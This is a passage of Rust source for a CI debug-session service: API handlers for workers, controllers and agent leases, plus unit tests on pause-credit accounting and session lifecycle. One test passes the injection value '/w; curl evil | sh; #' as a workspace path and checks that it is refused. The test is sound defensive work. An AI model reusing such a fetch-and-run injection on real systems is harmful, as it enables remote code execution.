    SessionState::Resumed
}

/// Worker: report that a verdict has been acted on.
pub(crate) async fn close_session(
    State(shared): State<Arc<SharedState>>,
    Extension(caller): Extension<WorkerJob>,
    Path(session_id): Path<String>,
    Json(body): Json<CloseSessionRequest>,
) -> Result<Json<serde_json::Value>, ApiError> {
    let mut inner = shared.state.inner.lock().await;
    owned_session(&inner, &session_id, caller)?;
    inner
        .debug_sessions
        .close(&session_id, body.state, SystemTime::now());
    Ok(Json(json!({ "ok": true })))
}

/// Controller: list open sessions.
pub(crate) async fn list_sessions(
    State(shared): State<Arc<SharedState>>,
) -> Result<Json<serde_json::Value>, ApiError> {
    let inner = shared.state.inner.lock().await;
    Ok(Json(json!({ "sessions": inner.debug_sessions.list() })))
}

/// Controller: fetch one session, by id or unique prefix.
pub(crate) async fn get_session(
    State(shared): State<Arc<SharedState>>,
    Path(reference): Path<String>,
) -> Result<Json<DebugSession>, ApiError> {
    let inner = shared.state.inner.lock().await;
    let id = inner
        .debug_sessions
        .resolve(&reference)
        .ok_or_else(|| ApiError::not_found(format!("no session matching: {reference}")))?;
    let record = inner
        .debug_sessions
        .get(&id)
        .ok_or_else(|| ApiError::not_found(format!("no such session: {id}")))?;
    Ok(Json(record.session.clone()))
}

/// Controller: issue a verdict.
pub(crate) async fn post_verdict(
    State(shared): State<Arc<SharedState>>,
    Path(reference): Path<String>,
    Json(req): Json<VerdictRequest>,
) -> Result<Json<DebugSession>, ApiError> {
    let mut inner = shared.state.inner.lock().await;
    let id = inner
        .debug_sessions
        .resolve(&reference)
        .ok_or_else(|| ApiError::not_found(format!("no session matching: {reference}")))?;
    if inner
        .debug_sessions
        .get(&id)
        .and_then(|record| record.agent_lease.as_ref())
        .is_some()
    {
        return Err(ApiError::forbidden(
            "session is controlled by an agent; release its lease before taking over",
        ));
    }
    let session = inner
        .debug_sessions
        .set_verdict(&id, &req)
        .ok_or_else(|| ApiError::not_found(format!("no such session: {id}")))?;
    info!(
        session = %id,
        verdict = req.verdict.as_str(),
        controller = req.controller.as_deref().unwrap_or("-"),
        "debug verdict issued"
    );
    Ok(Json(session))
}

/// Agent: acquire the single mutating controller lease.
pub(crate) async fn agent_acquire_lease(
    State(shared): State<Arc<SharedState>>,
    Path(session_id): Path<String>,
    Json(req): Json<AgentLeaseRequest>,
) -> Result<Json<AgentLeaseResponse>, ApiError> {
    let mut inner = shared.state.inner.lock().await;
    let id = inner
        .debug_sessions
        .resolve(&session_id)
        .ok_or_else(|| ApiError::not_found(format!("no session matching: {session_id}")))?;
    inner
        .debug_sessions
        .acquire_agent_lease(&id, &req)
        .map(Json)
        .map_err(ApiError::bad_request)
}

#[derive(Debug, Deserialize)]
pub(crate) struct AgentEventsQuery {
    #[serde(default)]
    after: u64,
    /// Seconds to wait for a new event when the cursor is current.
    #[serde(default)]
    wait: Option<u64>,
}

/// Agent: fetch structured events after a sequence number.
pub(crate) async fn agent_events(
    State(shared): State<Arc<SharedState>>,
    Path(session_id): Path<String>,
    Query(query): Query<AgentEventsQuery>,
) -> Result<Json<AgentEventsResponse>, ApiError> {
    let wait = query
        .wait
        .map(Duration::from_secs)
        .unwrap_or_default()
        .min(VERDICT_POLL_MAX);
    let deadline = tokio::time::Instant::now() + wait;
    let notify = shared.state.inner.lock().await.debug_sessions.notify();
    loop {
        let notified = notify.notified();
        {
            let inner = shared.state.inner.lock().await;
            let id = inner
                .debug_sessions
                .resolve(&session_id)
                .ok_or_else(|| ApiError::not_found(format!("no session matching: {session_id}")))?;
            let response = inner
                .debug_sessions
                .agent_events(&id, query.after)
                .map_err(ApiError::not_found)?;
            if !response.events.is_empty() || tokio::time::Instant::now() >= deadline {
                return Ok(Json(response));
            }
        }
        tokio::select! {
            () = notified => {}
            () = tokio::time::sleep_until(deadline) => {}
        }
    }
}

/// Agent: submit an idempotent, versioned operation.
pub(crate) async fn agent_operation(
    State(shared): State<Arc<SharedState>>,
    Path(session_id): Path<String>,
    Json(req): Json<AgentOperationRequest>,
) -> Result<Json<AgentOperationResponse>, ApiError> {
    let mut inner = shared.state.inner.lock().await;
    let id = inner
        .debug_sessions
        .resolve(&session_id)
        .ok_or_else(|| ApiError::not_found(format!("no session matching: {session_id}")))?;
    inner
        .debug_sessions
        .agent_operation(&id, req)
        .map(Json)
        .map_err(ApiError::bad_request)
}

/// Agent: release the controller lease without changing job state.
pub(crate) async fn agent_release_lease(
    State(shared): State<Arc<SharedState>>,
    Path(session_id): Path<String>,
    Json(req): Json<serde_json::Value>,
) -> Result<Json<serde_json::Value>, ApiError> {
    let lease_id = req
        .get("lease_id")
        .and_then(|value| value.as_str())
        .ok_or_else(|| ApiError::bad_request("lease_id is required"))?;
    let mut inner = shared.state.inner.lock().await;
    let id = inner
        .debug_sessions
        .resolve(&session_id)
        .ok_or_else(|| ApiError::not_found(format!("no session matching: {session_id}")))?;
    inner
        .debug_sessions
        .release_agent_lease(&id, lease_id)
        .map_err(ApiError::bad_request)?;
    Ok(Json(json!({ "released": true })))
}

/// Agent: retrieve the mutation audit trail for an open session.
pub(crate) async fn agent_audit(
    State(shared): State<Arc<SharedState>>,
    Path(session_id): Path<String>,
) -> Result<Json<Vec<AgentAuditEntry>>, ApiError> {
    let inner = shared.state.inner.lock().await;
    let id = inner
        .debug_sessions
        .resolve(&session_id)
        .ok_or_else(|| ApiError::not_found(format!("no session matching: {session_id}")))?;
    inner
        .debug_sessions
        .agent_audit(&id)
        .map(Json)
        .map_err(ApiError::not_found)
}

/// Sweep sessions the reaper can no longer justify keeping.
pub(crate) fn sweep(
    registry: &mut DebugSessionRegistry,
    now: SystemTime,
    active_requests: &std::collections::BTreeSet<i64>,
) {
    for id in registry.sweep_abandoned(now, active_requests) {
        warn!(session = %id, "debug session dropped — worker stopped polling or its job ended");
    }
}

/// Build an [`OpenSessionRequest`] for tests in other modules.
#[cfg(test)]
pub(crate) fn test_open_request(
    run_id: aksh_gha_protocol::RunId,
    job_id: aksh_gha_protocol::JobId,
) -> OpenSessionRequest {
    use aksh_gha_protocol::debug_session::FailedStep;
    OpenSessionRequest {
        run_id,
        job_id,
        agent_job_id: uuid::Uuid::new_v4(),
        job_name: "build".to_owned(),
        step: FailedStep {
            index: 1,
            total: 3,
            context_name: "__run".to_owned(),
            display_name: "Run cargo test".to_owned(),
            command: Some("cargo test".to_owned()),
            working_directory: None,
            exit_code: Some(101),
            elapsed_ms: 1_000,
            diagnostics: Vec::new(),
            log_excerpt: None,
        },
        machine: None,
        workspace: None,
        snapshot_commit: None,
        attempts: Vec::new(),
        attempt_changes: Vec::new(),
        job_steps: Vec::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use aksh_gha_protocol::debug_session::AttemptRecord;
    use aksh_gha_protocol::{JobId, RunId};

    fn at(secs: u64) -> SystemTime {
        UNIX_EPOCH + Duration::from_secs(1_700_000_000 + secs)
    }

    fn registry_with_session() -> (DebugSessionRegistry, String) {
        let mut registry = DebugSessionRegistry::default();
        let session = registry.open(
            7,
            test_open_request(RunId::new(), JobId("build".to_owned())),
            at(0),
        );
        let id = session.session_id.clone();
        (registry, id)
    }

    #[test]
    fn pause_accrues_until_the_verdict_is_delivered() {
        let (mut registry, id) = registry_with_session();

        // Still paused 60s in: the whole interval is excluded from timeout.
        assert_eq!(registry.paused_for_request(7, at(60)).as_secs(), 60);

        registry.set_verdict(
            &id,
            &VerdictRequest {
                verdict: Verdict::Retry,
                revert: Default::default(),
                controller: Some("cli".to_owned()),
                source_revision: None,
                retry_from_step: None,
            },
        );

        // Setting a verdict does not resume the clock — delivery does.
        assert_eq!(registry.paused_for_request(7, at(90)).as_secs(), 90);

        let delivered = registry.take_verdict(&id, at(100)).unwrap();
        assert_eq!(delivered.verdict, Some(Verdict::Retry));

        // Banked at 100s and the clock is stopped: later reads do not grow.
        assert_eq!(registry.paused_for_request(7, at(500)).as_secs(), 100);
    }

    #[test]
    fn empty_poll_is_not_a_verdict_and_does_not_bank_time() {
        let (mut registry, id) = registry_with_session();
        let response = registry.take_verdict(&id, at(30)).unwrap();
        assert_eq!(response.verdict, None);
        // Clock still running — an empty poll must not look like resumption.
        assert_eq!(registry.paused_for_request(7, at(60)).as_secs(), 60);
    }

    #[test]
    fn reopening_the_same_job_preserves_banked_pause_time() {
        let mut registry = DebugSessionRegistry::default();
        let run_id = RunId::new();
        let job_id = JobId("build".to_owned());

        let first = registry.open(7, test_open_request(run_id, job_id.clone()), at(0));
        registry.set_verdict(
            &first.session_id,
            &VerdictRequest {
                verdict: Verdict::Retry,
                revert: Default::default(),
                controller: None,
                source_revision: None,
                retry_from_step: None,
            },
        );
        registry.take_verdict(&first.session_id, at(50));

        // Retry fails again: same session id, banked time carried forward.
        let second = registry.open(7, test_open_request(run_id, job_id), at(60));
        assert_eq!(second.session_id, first.session_id);
        // Version is monotonic across the whole session lifetime, not just
        // across opens: open(1) → verdict(2) → reopen(3).
        assert_eq!(second.version, 3);
        assert_eq!(registry.paused_for_request(7, at(60)).as_secs(), 50);
        assert_eq!(registry.paused_for_request(7, at(70)).as_secs(), 60);
    }

    fn active(ids: [i64; 1]) -> std::collections::BTreeSet<i64> {
        ids.into_iter().collect()
    }

    #[test]
    fn abandoned_sessions_stop_suspending_the_timeout() {
        let (mut registry, id) = registry_with_session();
        assert!(registry.is_paused(7, at(0)));

        // Worker never polls again.
        let swept =
            registry.sweep_abandoned(at(WORKER_LIVENESS_WINDOW.as_secs() + 10), &active([7]));
        assert_eq!(swept, vec![id]);
        assert!(!registry.is_paused(7, at(0)));
        // Accrual stops at the sweep, but the credit earned up to it is kept:
        // the job really was paused for those 100 seconds, and re-billing them
        // would cancel a job that is executing well inside its timeout.
        assert_eq!(registry.paused_for_request(7, at(1_000)).as_secs(), 100);
    }

    /// Closing a session must not hand the job's paused time back to the
    /// reaper.
    ///
    /// The banked total lives in the session record, and closing drops it. Read
    /// from live records alone the credit snapped to zero exactly when the job
    /// resumed, so a job paused for an hour was cancelled an hour early — and
    /// the cancellation looked like an ordinary timeout, with nothing to
    /// attribute it to.
    #[test]
    fn credit_survives_the_close_that_resumes_the_job() {
        let (mut registry, id) = registry_with_session();
        registry.set_verdict(
            &id,
            &VerdictRequest {
                verdict: Verdict::Continue,
                revert: Default::default(),
                controller: Some("cli".to_owned()),
                source_revision: None,
                retry_from_step: None,
            },
        );
        registry.take_verdict(&id, at(100));
        registry.close(&id, SessionState::Resumed, at(100));

        assert!(registry.get(&id).is_none(), "the session is gone");
        assert!(!registry.is_paused(7, at(100)), "the job is running again");
        assert_eq!(registry.paused_for_request(7, at(100)).as_secs(), 100);
        // And it stays banked rather than growing: the clock is stopped.
        assert_eq!(registry.paused_for_request(7, at(5_000)).as_secs(), 100);
    }

    /// A retry loop banks a fresh interval per failure; the request's credit is
    /// the sum, not the last one.
    #[test]
    fn credit_accumulates_across_retries() {
        let mut registry = DebugSessionRegistry::default();
        let run_id = RunId::new();
        let job_id = JobId("build".to_owned());
        let retry = VerdictRequest {
            verdict: Verdict::Retry,
            revert: Default::default(),
            controller: None,
            source_revision: None,
            retry_from_step: None,
        };

        // Three failures, each paused 100s and closed before the next attempt.
        for attempt in 0..3u64 {
            let opened_at = attempt * 200;
            let session =
                registry.open(7, test_open_request(run_id, job_id.clone()), at(opened_at));
            registry.set_verdict(&session.session_id, &retry);
            registry.take_verdict(&session.session_id, at(opened_at + 100));
            registry.close(
                &session.session_id,
                SessionState::Resumed,
                at(opened_at + 100),
            );
            assert_eq!(
                registry
                    .paused_for_request(7, at(opened_at + 100))
                    .as_secs(),
                (attempt + 1) * 100
            );
        }

        // A fourth pause, still open, adds to the retired total rather than
        // starting over.
        registry.open(7, test_open_request(run_id, job_id), at(600));
        assert_eq!(registry.paused_for_request(7, at(650)).as_secs(), 350);
    }

    /// The ceiling is per request, so closing and reopening cannot renew it.
    #[test]
    fn accumulated_credit_is_capped_at_the_ceiling() {
        let mut registry = DebugSessionRegistry::default();
        let run_id = RunId::new();
        let job_id = JobId("build".to_owned());
        // Three quarters of the ceiling, banked and retired.
        let long_pause = MAX_PAUSE_CREDIT.as_secs() * 3 / 4;
        let first = registry.open(7, test_open_request(run_id, job_id.clone()), at(0));
        registry.set_verdict(
            &first.session_id,
            &VerdictRequest {
                verdict: Verdict::Retry,
                revert: Default::default(),
                controller: None,
                source_revision: None,
                retry_from_step: None,
            },
        );
        registry.take_verdict(&first.session_id, at(long_pause));
        registry.close(&first.session_id, SessionState::Resumed, at(long_pause));
        assert_eq!(
            registry.paused_for_request(7, at(long_pause)).as_secs(),
            long_pause
        );

        // The retry fails and pauses for as long again: 1.5x the ceiling in
        // total, which must still buy exactly one ceiling's worth.
        let second = registry.open(7, test_open_request(run_id, job_id), at(long_pause + 1));
        assert_ne!(second.session_id, first.session_id, "a fresh session");
        assert_eq!(second.paused_seconds, 0, "credit is not double counted");
        assert!(
            registry.is_paused(7, at(long_pause + 2)),
            "credit remains, so the pause still holds the job"
        );
        assert_eq!(
            registry.paused_for_request(7, at(long_pause * 2 + 1)),
            MAX_PAUSE_CREDIT
        );
        assert!(
            !registry.is_paused(7, at(long_pause * 2 + 1)),
            "out of credit: the job's own timeout takes over again"
        );
    }

    /// An archived session's credit outlives its history, and both outlive the
    /// worker that abandoned it — until the request itself ends.
    #[test]
    fn credit_outlives_the_archive_and_is_retired_with_the_request() {
        let (mut registry, id) = registry_with_session();
        registry.close(&id, SessionState::Aborted, at(100));
        // Archived, not merely dropped: an agent can still read the history.
        assert!(registry.agent_events(&id, 0).is_ok());
        assert_eq!(registry.paused_for_request(7, at(100)).as_secs(), 100);

        // Reaper ticks pass with the job still winding down.
        registry.sweep_abandoned(at(200), &active([7]));
        assert_eq!(
            registry.paused_for_request(7, at(200)).as_secs(),
            100,
            "a sweep must not confiscate an active request's credit"
        );

        // The job ends. Nothing can ask about its timeout again, so the credit
        // goes with it — this is what bounds the map on a long-lived server.
        registry.sweep_abandoned(at(300), &std::collections::BTreeSet::new());
        assert_eq!(registry.paused_for_request(7, at(300)).as_secs(), 0);
        assert!(registry.retired_credit.is_empty());
    }

    #[test]
    fn polling_keeps_a_session_alive() {
        let (mut registry, id) = registry_with_session();
        // Worker polls at 80s, inside the window.
        registry.take_verdict(&id, at(80));
        assert!(registry
            .sweep_abandoned(at(WORKER_LIVENESS_WINDOW.as_secs() + 10), &active([7]))
            .is_empty());
        assert!(registry.is_paused(7, at(0)));
    }

    #[test]
    fn a_finished_job_drops_its_session_even_while_the_worker_polls() {
        let (mut registry, id) = registry_with_session();
        registry.take_verdict(&id, at(10));

        // The job completed or was cancelled: request 7 is no longer active.
        let swept = registry.sweep_abandoned(at(20), &std::collections::BTreeSet::new());
        assert_eq!(swept, vec![id]);
        assert!(!registry.is_paused(7, at(20)));
    }

    #[test]
    fn pause_credit_is_capped_so_a_timeout_cannot_be_suspended_forever() {
        let (registry, _) = registry_with_session();
        let far_future = at(MAX_PAUSE_CREDIT.as_secs() * 10);
        assert_eq!(registry.paused_for_request(7, far_future), MAX_PAUSE_CREDIT);
        // Past the ceiling the session stops protecting the job from the
        // disconnect reaper.
        assert!(!registry.is_paused(7, far_future));
    }

    #[test]
    fn a_session_is_owned_by_the_job_that_opened_it() {
        let mut registry = DebugSessionRegistry::default();
        let request = test_open_request(RunId::new(), JobId("build".to_owned()));
        let agent_job_id = request.agent_job_id;
        let session = registry.open(7, request, at(0));
        assert_eq!(registry.owner(&session.session_id), Some(agent_job_id));
        assert_eq!(registry.owner("dbg_nope"), None);
    }

    #[test]
    fn a_shell_active_workspace_path_is_refused() {
        let mut registry = DebugSessionRegistry::default();
        let mut request = test_open_request(RunId::new(), JobId("build".to_owned()));
        request.workspace = Some("/w; curl evil | sh; #".to_owned());
        let session = registry.open(7, request, at(0));
        assert_eq!(session.workspace, None);

        let mut ok = test_open_request(RunId::new(), JobId("other".to_owned()));
        ok.workspace = Some("/home/runner/work/repo/repo".to_owned());
        assert_eq!(
            registry.open(8, ok, at(0)).workspace.as_deref(),
            Some("/home/runner/work/repo/repo")
        );
    }

    #[test]
    fn abort_verdict_closes_the_session() {
        let (mut registry, id) = registry_with_session();
        let updated = registry
            .set_verdict(
                &id,
                &VerdictRequest {
                    verdict: Verdict::Abort,
                    revert: Default::default(),
                    controller: None,
                    source_revision: None,
                    retry_from_step: None,
                },
            )
            .unwrap();
        assert_eq!(updated.state, SessionState::Aborted);
        assert!(!updated.state.is_open());
        assert!(registry.list().is_empty());
    }

    #[test]
    fn resolve_matches_prefix_and_rejects_ambiguity() {
        let mut registry = DebugSessionRegistry::default();
        let a = registry.open(
            1,
            test_open_request(RunId::new(), JobId("a".to_owned())),
            at(0),
        );
        registry.open(
            2,
            test_open_request(RunId::new(), JobId("b".to_owned())),
            at(1),
        );

        assert_eq!(registry.resolve(&a.session_id), Some(a.session_id.clone()));
        assert_eq!(registry.resolve(&a.session_id[..10]), Some(a.session_id));
        // "dbg_" prefixes both sessions.
        assert_eq!(registry.resolve("dbg_"), None);
        assert_eq!(registry.resolve("nope"), None);
    }

    #[test]
    fn verdict_records_the_source_revision_for_the_next_attempt() {
        let (mut registry, id) = registry_with_session();
        registry.set_verdict(
            &id,
            &VerdictRequest {
                verdict: Verdict::Retry,
                revert: Default::default(),
                controller: Some("agent".to_owned()),
                source_revision: Some("repair-1".to_owned()),
                retry_from_step: Some(0),
            },
        );
        let delivered = registry.take_verdict(&id, at(10)).unwrap();
        assert_eq!(delivered.source_revision.as_deref(), Some("repair-1"));
        assert_eq!(delivered.retry_from_step, Some(0));
        assert_eq!(
            registry.get(&id).unwrap().session.source_revision,
            "repair-1"
        );
    }

    #[test]
    fn attempt_journal_survives_reopen() {
        let mut registry = DebugSessionRegistry::default();
        let run_id = RunId::new();
        let job_id = JobId("build".to_owned());
        registry.open(7, test_open_request(run_id, job_id.clone()), at(0));

        let mut reopened = test_open_request(run_id, job_id);
        reopened.attempts = vec![
            AttemptRecord {
                attempt: 1,
                outcome: "Failure".to_owned(),
                exit_code: Some(101),
                elapsed_ms: 1_000,
                source_revision: "original".to_owned(),
            },
            AttemptRecord {
                attempt: 2,
                outcome: "Failure".to_owned(),
                exit_code: Some(101),
                elapsed_ms: 900,
                source_revision: "repair-1".to_owned(),
            },
        ];
        let session = registry.open(7, reopened, at(60));
        assert_eq!(session.attempts.len(), 2);
        assert_eq!(session.attempts[1].source_revision, "repair-1");
    }

    #[test]
    fn agent_lease_is_single_controller_and_idempotent() {
        let (mut registry, id) = registry_with_session();
        let request = AgentLeaseRequest {
            controller: "agent-1".to_owned(),
            capabilities: vec!["job.retry_from".to_owned()],
        };
        let first = registry.acquire_agent_lease(&id, &request).unwrap();
        let again = registry.acquire_agent_lease(&id, &request).unwrap();
        assert_eq!(first, again);

        let other = registry.acquire_agent_lease(
            &id,
            &AgentLeaseRequest {
                controller: "agent-2".to_owned(),
                capabilities: Vec::new(),
            },
        );
        assert!(other.unwrap_err().contains("already leased"));
    }

    #[test]
    fn agent_events_and_operations_are_structured_and_idempotent() {
        let (mut registry, id) = registry_with_session();
        let lease = registry
            .acquire_agent_lease(
                &id,
                &AgentLeaseRequest {
                    controller: "agent".to_owned(),
                    capabilities: vec!["job.retry_from".to_owned()],
                },
            )
            .unwrap();
        let events = registry.agent_events(&id, 0).unwrap();
        assert_eq!(events.events.len(), 2);
        assert_eq!(events.events[0].event, "step_failed");
        assert_eq!(events.events[1].event, "agent_attached");

        let request = AgentOperationRequest {
            request_id: "retry-1".to_owned(),
            expected_version: 1,
            lease_id: lease.lease_id,
            operation: AgentOperation::RetryFrom {
                step_index: 0,
                revert: Default::default(),
            },
        };
        let response = registry.agent_operation(&id, request.clone()).unwrap();
        assert_eq!(response.prev_version, 1);
        assert_eq!(response.new_version, 2);
        assert_eq!(response.status, "retrying");
        assert_eq!(response.session.state, SessionState::Retrying);

        let duplicate = registry.agent_operation(&id, request).unwrap();
        assert_eq!(duplicate, response);

        let audit = registry.agent_audit(&id).unwrap();
        assert_eq!(audit.len(), 1);
        assert_eq!(audit[0].request_id, "retry-1");
    }

    #[test]
    fn agent_operations_reject_stale_versions_and_future_steps() {
        let (mut registry, id) = registry_with_session();
        let lease = registry
            .acquire_agent_lease(
                &id,
                &AgentLeaseRequest {
                    controller: "agent".to_owned(),
                    capabilities: Vec::new(),
                },
            )
            .unwrap();
        let stale = registry.agent_operation(
            &id,
            AgentOperationRequest {
                request_id: "stale".to_owned(),
                expected_version: 0,
                lease_id: lease.lease_id.clone(),
                operation: AgentOperation::Retry {
                    revert: Default::default(),
                },
            },
        );
        assert!(stale.unwrap_err().contains("stale session version"));

        let future = registry.agent_operation(
            &id,
            AgentOperationRequest {
                request_id: "future".to_owned(),
                expected_version: 1,
                lease_id: lease.lease_id,
                operation: AgentOperation::RetryFrom {
                    step_index: 2,
                    revert: Default::default(),
                },
            },
        );
        assert!(future.unwrap_err().contains("after failed step"));
    }

    #[test]
    fn agent_history_survives_session_close() {
        let (mut registry, id) = registry_with_session();
        let lease = registry
            .acquire_agent_lease(
                &id,
                &AgentLeaseRequest {
                    controller: "agent".to_owned(),
                    capabilities: Vec::new(),
                },
            )
            .unwrap();
        registry
            .agent_operation(
                &id,
                AgentOperationRequest {
                    request_id: "abort-1".to_owned(),
                    expected_version: 1,
                    lease_id: lease.lease_id,
                    operation: AgentOperation::Abort,
                },
            )
            .unwrap();
        registry.close(&id, SessionState::Aborted, at(1));

        assert!(!registry.sessions.contains_key(&id));
        assert_eq!(registry.agent_events(&id, 0).unwrap().events.len(), 4);
        assert_eq!(registry.agent_audit(&id).unwrap().len(), 1);
    }

    #[test]
    fn agent_lease_survives_a_retry_transition_to_the_next_pause() {
        let run_id = RunId::new();
        let job_id = JobId("build".to_owned());
        let mut registry = DebugSessionRegistry::default();
        let first = registry.open(7, test_open_request(run_id, job_id.clone()), at(0));
        let lease = registry
            .acquire_agent_lease(
                &first.session_id,
                &AgentLeaseRequest {
                    controller: "agent".to_owned(),
                    capabilities: Vec::new(),
                },
            )
            .unwrap();
        registry
            .agent_operation(
                &first.session_id,
                AgentOperationRequest {
                    request_id: "retry-1".to_owned(),
                    expected_version: 1,
                    lease_id: lease.lease_id,
                    operation: AgentOperation::Retry {
                        revert: Default::default(),
                    },
                },
            )
            .unwrap();
        registry.take_verdict(&first.session_id, at(1));
        registry.close(&first.session_id, SessionState::Resumed, at(1));

        let second = registry.open(7, test_open_request(run_id, job_id), at(2));
        assert_eq!(second.session_id, first.session_id);
        assert_eq!(
            registry
                .agent_events(&second.session_id, 0)
                .unwrap()
                .events
                .len(),
            5
        );
        assert!(registry
            .get(&second.session_id)
            .unwrap()
            .agent_lease
            .is_some());
    }
}
